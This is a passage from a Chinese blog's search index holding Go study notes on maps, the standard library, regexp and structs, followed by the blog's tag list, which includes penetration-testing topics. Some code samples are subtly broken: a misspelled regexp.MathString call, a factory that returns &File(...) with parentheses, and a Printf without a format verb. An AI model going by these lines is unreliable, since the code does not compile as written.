make([]map[int]int, 5) for _, item := range items2 { item = make(map[int]int, 1) // item is only a copy of the slice element. item[1] = 2 // This 'item' will be lost on the next iteration. } fmt.Printf(&quot;Version B: Value of items: %v\\n&quot;, items2)} 输出结果： 12Version A: Value of items: [map[1:2] map[1:2] map[1:2] map[1:2] map[1:2]]Version B: Value of items: [map[] map[] map[] map[] map[]] 需要注意的是，应当像 A 版本那样通过索引使用切片的 map 元素。在 B 版本中获得的项只是 map 值的一个拷贝而已，所以真正的 map 元素没有得到初始化。 map 的排序map 默认是无序的，不管是按照 key 还是按照 value 默认都不排序 如果你想为 map 排序，需要将 key（或者 value）拷贝到一个切片，再对切片排序（使用 sort 包，详见第 7.6.6 节），然后可以使用切片的 for-range 方法打印出所有的 key 和 value。 将 map 的键值对调这里倒置是指调换 key 和 value。如果 map 的值类型可以作为 key 且所有的 value 是唯一的，那么通过下面的方法可以简单的做到键值对调。 1234567891011121314151617181920212223242526272829package mainimport ( &quot;fmt&quot;)var ( barVal = map[string]int{&quot;alpha&quot;: 34, &quot;bravo&quot;: 56, &quot;charlie&quot;: 23, &quot;delta&quot;: 87, &quot;echo&quot;: 56, &quot;foxtrot&quot;: 12, &quot;golf&quot;: 34, &quot;hotel&quot;: 16, &quot;indio&quot;: 87, &quot;juliet&quot;: 65, &quot;kili&quot;: 43, &quot;lima&quot;: 98})func main() { invMap := make(map[int]string, len(barVal)) for k, v := range barVal { invMap[v] = k } fmt.Println(&quot;inverted:&quot;) for k, v := range invMap { fmt.Printf(&quot;Key: %v, Value: %v / &quot;, k, v) } fmt.Println()}输出结果：inverted:Key: 34, Value: golf / Key: 23, Value: charlie / Key: 16, Value: hotel / Key: 87, Value: delta / Key: 98, Value: lima / Key: 12, Value: foxtrot / Key: 43, Value: kili / Key: 56, Value: bravo / Key: 65, Value: juliet / ​ 包（package）标准库概述像 fmt、os 等这样具有常用功能的内置包在 Go 语言中有 150 个以上，它们被称为标准库，大部分(一些底层的除外)内置于 Go 本身。完整列表可以在 Go Walker 查看。 unsafe: 包含了一些打破 Go 语言“类型安全”的命令，一般的程序中不会被使用，可用在 C/C++ 程序的调用中。 syscall-os-os/exec: os: 提供给我们一个平台无关性的操作系统功能接口，采用类Unix设计，隐藏了不同操作系统间差异，让不同的文件系统和操作系统对象表现一致。 os/exec: 提供我们运行外部操作系统命令和程序的方式。 syscall: 底层的外部包，提供了操作系统底层调用的基本接口。 archive/tar 和 /zip-compress：压缩(解压缩)文件功能。 fmt-io-bufio-path/filepath-flag: fmt: 提供了格式化输入输出功能。 io: 提供了基本输入输出功能，大多数是围绕系统功能的封装。 bufio: 缓冲输入输出功能的封装。 path/filepath: 用来操作在当前系统中的目标文件名路径。 flag: 对命令行参数的操作。 strings-strconv-unicode-regexp-bytes: strings: 提供对字符串的操作。 strconv: 提供将字符串转换为基础类型的功能。 unicode: 为 unicode 型的字符串提供特殊的功能。 regexp: 正则表达式功能。 bytes: 提供对字符型分片的操作。 index/suffixarray: 子字符串快速查询。 math-math/cmath-math/big-math/rand-sort: math: 基本的数学函数。 math/cmath: 对复数的操作。 math/rand: 伪随机数生成。 sort: 为数组排序和自定义集合。 math/big: 大数的实现和计算。 container-/list-ring-heap: 实现对集合的操作。 list: 双链表。 time-log: time: 日期和时间的基本操作。 log: 记录程序运行时产生的日志,我们将在后面的章节使用它。 encoding/json-encoding/xml-text/template: encoding/json: 读取并解码和写入并编码 JSON 数据。 encoding/xml:简单的 XML1.0 解析器,有关 JSON 和 XML 的实例请查阅第 12.9/10 章节。 text/template:生成像 HTML 一样的数据与文本混合的数据驱动模板（参见第 15.7 节）。 net-net/http-html:（参见第 15 章） net: 网络数据的基本操作。 http: 提供了一个可扩展的 HTTP 服务器和基础客户端，解析 HTTP 请求和回复。 html: HTML5 解析器。 runtime: Go 程序运行时的交互操作，例如垃圾回收和协程创建。 reflect: 实现通过程序运行时反射，让程序操作任意类型的变量。 regexp 包下面的程序里，我们将在字符串中对正则表达式进行匹配。 如果是简单模式，使用 Match 方法便可： 1ok, _ := regexp.Match(pat, []byte(searchIn)) 变量 ok 将返回 true 或者 false,我们也可以使用 MatchString： 1ok, _ := regexp.MathString(pat, searchIn) 更多方法中，必须先将正则通过 Compile 方法返回一个 Regexp 对象。然后我们将掌握一些匹配，查找，替换相关的功能。 示例 9.2 pattern.go： 12345678910111213141516171819202122232425262728293031323334package mainimport ( &quot;fmt&quot; &quot;regexp&quot; &quot;strconv&quot;)func main() { //目标字符串 searchIn := &quot;John: 2578.34 William: 4567.23 Steve: 5632.18&quot; pat := &quot;[0-9]+.[0-9]+&quot; //正则 f := func(s string) string{ v, _ := strconv.ParseFloat(s, 32) return strconv.FormatFloat(v * 2, 'f', 2, 32) } if ok, _ := regexp.Match(pat, []byte(searchIn)); ok { fmt.Println(&quot;Match Found!&quot;) } re, _ := regexp.Compile(pat) //将匹配到的部分替换为&quot;##.#&quot; str := re.ReplaceAllString(searchIn, &quot;##.#&quot;) fmt.Println(str) //参数为函数时 str2 := re.ReplaceAllStringFunc(searchIn, f) fmt.Println(str2)}输出结果：Match Found!John: ##.# William: ##.# Steve: ##.#John: 5156.68 William: 9134.46 Steve: 11264.36 锁和 sync 包精密计算和 big 包自定义包和可见性为自定义包使用 godoc使用 go install 安装自定义包自定义包的目录结构、go install 和 go test通过 Git 打包和安装Go 的外部包和项目结构（struct）与方法（method）结构体定义（struct）结构体定义的一般方式如下： 12345type identifier struct { field1 type1 field2 type2 ...} type T struct {a, b int} 也是合法的语法，它更适用于简单的结构体。 https://www.kancloud.cn/kancloud/the-way-to-go/72512 使用工厂方法创建结构体实例Go 语言不支持面向对象编程语言中那样的构造子方法，但是可以很容易的在 Go 中实现 “构造子工厂“ 方法。为了方便通常会为类型定义一个工厂，按惯例，工厂的名字以 new 或 New 开头。假设定义了如下的 File 结构体类型： 1234type File struct { fd int // 文件描述符 name string // 文件名} 下面是这个结构体类型对应的工厂方法，它返回一个指向结构体实例的指针： 1234567func NewFile(fd int, name string) *File { if fd &lt; 0 { return nil } return &amp;File(fd, name)} 然后这样调用它： 1f := NewFile(10, &quot;./test.txt&quot;) 在 Go 语言中常常像上面这样在工厂方法里使用初始化来简便的实现构造子。 如果 File 是一个结构体类型，那么表达式 new(File) 和 &amp;File{} 是等价的。 这可以和大多数面向对象编程语言中笨拙的初始化方式做个比较：File f = new File(...)。 我们可以说是工厂实例化了类型的一个对象，就像在基于类的OO语言中那样。 如果想知道结构体类型T的一个实例占用了多少内存，可以使用：size := unsafe.Sizeof(T{})。 使用自定义包中的结构体下面的例子中，main.go 使用了一个结构体，它来自 struct_pack 下的包 structPack。 示例 10.5 structPack.go： 123456package structPacktype ExpStruct struct { Mi1 int Mf1 float32} 示例 10.6 main.go： 12345678910111213141516171819package mainimport ( &quot;fmt&quot; &quot;./struct_pack/structPack&quot;)func main() { struct1 := new(structPack.ExpStruct) struct1.Mi1 = 10 struct1.Mf1 = 16. fmt.Printf(&quot;Mi1 = %d\\n&quot;, struct1.Mi1) fmt.Printf(&quot;Mf1 = %f\\n&quot;, struct1.Mf1)}输出：Mi1 = 10Mf1 = 16.000000 带标签的结构体结构体中的字段除了有名字和类型外，还可以有一个可选的标签（tag）：它是一个附属于字段的字符串，可以是文档或其他的重要标记。标签的内容不可以在一般的编程中使用，只有包 reflect 能获取它。我们将在下一章（第 11.10 节）中深入的探讨 reflect包，它可以在运行时自省类型、属性和方法，比如：在一个变量上调用 reflect.TypeOf() 可以获取变量的正确类型，如果变量是一个结构体类型，就可以通过 Field 来索引结构体的字段，然后就可以使用 Tag 属性。 示例 10.7 struct_tag.go： 12345678910111213141516171819202122232425262728293031package mainimport ( &quot;fmt&quot; &quot;reflect&quot;)type TagType struct { // tags field1 bool &quot;An important answer&quot; field2 string &quot;The name of the thing&quot; field3 int &quot;How much there are&quot;}func main() { tt := TagType{true, &quot;Barak Obama&quot;, 1} for i := 0; i &lt; 3; i++ { refTag(tt, i) }}func refTag(tt TagType, ix int) { ttType := reflect.TypeOf(tt) ixField := ttType.Field(ix) fmt.Printf(&quot;%v\\n&quot;, ixField.Tag)}输出：An important answerThe name of the thingHow much there are 匿名字段和内嵌结构体结构体可以包含一个或多个 匿名（或内嵌）字段，即这些字段没有显式的名字，只有字段的类型是必须的，此时类型也就是字段的名字。匿名字段本身可以是一个结构体类型，即 结构体可以包含内嵌结构体。 可以粗略地将这个和面向对象语言中的继承概念相比较，随后将会看到它被用来模拟类似继承的行为。Go 语言中的继承是通过内嵌或组合来实现的，所以可以说，在 Go 语言中，相比较于继承，组合更受青睐。 匿名结构体12345678910111213141516171819202122232425262728293031323334353637383940414243package mainimport &quot;fmt&quot;type innerS struct { in1 int in2 int}type outerS struct { b int c float32 int // anonymous field innerS //anonymous field}func main() { outer := new(outerS) outer.b = 6 outer.c = 7.5 outer.int = 60 outer.in1 = 5 outer.in2 = 10 fmt.Printf(&quot;outer.b is: %d\\n&quot;, outer.b) fmt.Printf(&quot;outer.c is: %f\\n&quot;, outer.c) fmt.Printf(&quot;outer.int is: %d\\n&quot;, outer.int) fmt.Printf(&quot;outer.in1 is: %d\\n&quot;, outer.in1) fmt.Printf(&quot;outer.in2 is: %d\\n&quot;, outer.in2) // 使用结构体字面量 outer2 := outerS{6, 7.5, 60, innerS{5, 10}} fmt.Printf(&quot;outer2 is:&quot;, outer2)}输出：outer.b is: 6outer.c is: 7.500000outer.int is: 60outer.in1 is: 5outer.in2 is: 10outer2 is:{6 7.5 60 {5 10}} 通过类型 outer.int 的名字来获取存储在匿名字段中的数据，于是可以得出一个结论：在一个结构体中对于每一种数据类型只能有一个匿名字段。 内嵌结构体同样地结构体也是一种数据类型，所以它也可以作为一个匿名字段来使用，如同上面例子中那样。外层结构体通过outer.in1 直接进入内层结构体的字段，内嵌结构体甚至可以来自其他包。内层结构体被简单的插入或者内嵌进外层结构体。这个简单的“继承”机制提供了一种方式，使得可以从另外一个或一些类型继承部分或全部实现。 1234567891011121314151617181920212223package mainimport &quot;fmt&quot;type A struct { ax, ay int}type B struct { A bx, by float32}func main() { b := B{A{1, 2}, 3.0, 4.0} fmt.Println(b.ax, b.ay, b.bx, b.by) fmt.Println(b.A)}输出：1 2 3 4{1 2} 方法（method）垃圾回收和 SetFinalizer接口（interface）与反射（reflection）接口是什么接口嵌套接口类型断言：如何检测和转换接口变量的类型类型判断：type-switch测试一个值是否实现了某个接口使用方法集与接口第一个例子：使用 Sorter 接口排序第二个例子：读和写空接口反射包Go 高级编程读写数据读取用户的输入文件读写文件拷贝从命令行读取参数用buffer读取文件用切片读写文件用 defer 关闭文件使用接口的实际例子：fmt.FprintfJson 数据格式XML 数据格式用 Gob 传输数据Go 中的密码学错误处理与测试错误处理运行时异常和 panic从 panic 中恢复（Recover）自定义包中的错误处理和 panicking一种用闭包处理错误的模式启动外部命令和程序Go 中的单元测试和基准测试测试的具体例子用（测试数据）表驱动测试性能调试：分析并优化协程（goroutine）与通道（channel）并发、并行和协程使用通道进行协程间通信协程同步：关闭通道-对阻塞的通道进行测试使用 select 切换协程通道，超时和计时器（Ticker）协程和恢复（recover）网络、模版与网页应用tcp服务器一个简单的web服务器访问并读取页面数据写一个简单的网页应用实际应用常见的陷阱与错误误用短声明导致变量覆盖误用字符串发生错误时使用defer关闭一个文件不需要将一个指向切片的指针传递给函数使用指针指向接口类型使用值类型时误用指针误用协程和通道闭包和协程的使用糟糕的错误处理模式关于逗号ok模式出于性能考虑的实用代码片段字符串数组和切片映射结构体接口函数文件协程（goroutine）与通道（channel）网络和网页应用其他出于性能考虑的最佳实践和建议","link":"/2021/09/27/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"随想","slug":"随想","link":"/tags/%E9%9A%8F%E6%83%B3/"},{"name":"文件上传","slug":"文件上传","link":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"00截断","slug":"00截断","link":"/tags/00%E6%88%AA%E6%96%AD/"},{"name":"旅行","slug":"旅行","link":"/tags/%E6%97%85%E8%A1%8C/"},{"name":"SQL注入","slug":"SQL注入","link":"/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"WIN提权","slug":"WIN提权","link":"/tags/WIN%E6%8F%90%E6%9D%83/"},{"name":"BurpSuite","slug":"BurpSuite","link":"/tags/BurpSuite/"},{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"暴力破解","slug":"暴力破解","link":"/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"BypassAV","slug":"BypassAV","link":"/tags/BypassAV/"},{"name":"HTML","slug":"HTML","link":"/tags/HTML/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"Sqlmap","slug":"Sqlmap","link":"/tags/Sqlmap/"},{"name":"网站建设","slug":"网站建设","link":"/tags/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"},{"name":"一星期实战总结","slug":"一星期实战总结","link":"/tags/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"},{"name":"面试经验","slug":"面试经验","link":"/tags/%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C/"},{"name":"乐理基础","slug":"乐理基础","link":"/tags/%E4%B9%90%E7%90%86%E5%9F%BA%E7%A1%80/"},{"name":"内网渗透","slug":"内网渗透","link":"/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"GetShell","slug":"GetShell","link":"/tags/GetShell/"},{"name":"小技巧","slug":"小技巧","link":"/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/"},{"name":"水坑攻击","slug":"水坑攻击","link":"/tags/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/"},{"name":"域渗透","slug":"域渗透","link":"/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"电音","slug":"电音","link":"/tags/%E7%94%B5%E9%9F%B3/"},{"name":"Short filename","slug":"Short-filename","link":"/tags/Short-filename/"},{"name":"端口渗透","slug":"端口渗透","link":"/tags/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F/"},{"name":"信息收集","slug":"信息收集","link":"/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"解析漏洞","slug":"解析漏洞","link":"/tags/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"},{"name":"鱼叉攻击","slug":"鱼叉攻击","link":"/tags/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB/"},{"name":"网络安全法","slug":"网络安全法","link":"/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"},{"name":"Golang","slug":"Golang","link":"/tags/Golang/"}],"categories":[{"name":"生活随笔","slug":"生活随笔","link":"/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"},{"name":"渗透测试","slug":"渗透测试","link":"/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]}